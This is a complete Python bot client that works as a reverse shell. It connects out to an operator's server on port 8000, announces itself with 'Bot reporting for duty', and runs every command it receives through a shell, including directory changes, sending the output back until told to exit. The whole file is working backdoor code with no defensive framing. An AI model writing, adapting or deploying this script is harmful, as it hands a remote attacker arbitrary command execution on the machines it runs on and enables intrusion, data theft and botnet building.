#! /usr/bin/python

import os
import sys
from subprocess import Popen, PIPE
from socket import *

serverName = sys.argv[1]
serverPort = 8000

#Create IPv4(AF_INET), TCPSocket(Sock_Stream)
clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect((serverName, serverPort))
clientSocket.send('Bot reporting for duty'.encode())
command = clientSocket.recv(4064).decode()


while command != "exit": 
	if command[:2] == "cd":
		if(os.path.isdir(command[3:]) == 1):
			os.chdir(command[3:])
			clientSocket.send("changed directory".encode())
		else:
			clientSocket.send("Invalid directory path".encode())
		command = (clientSocket.recv(4064)).decode()
	else:
		proc = Popen(command, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
		result, err = proc.communicate()
		if(err.decode() != ""):
			print(err)
		clientSocket.send(result + err)
		command = (clientSocket.recv(4064)).decode()
	

clientSocket.close()
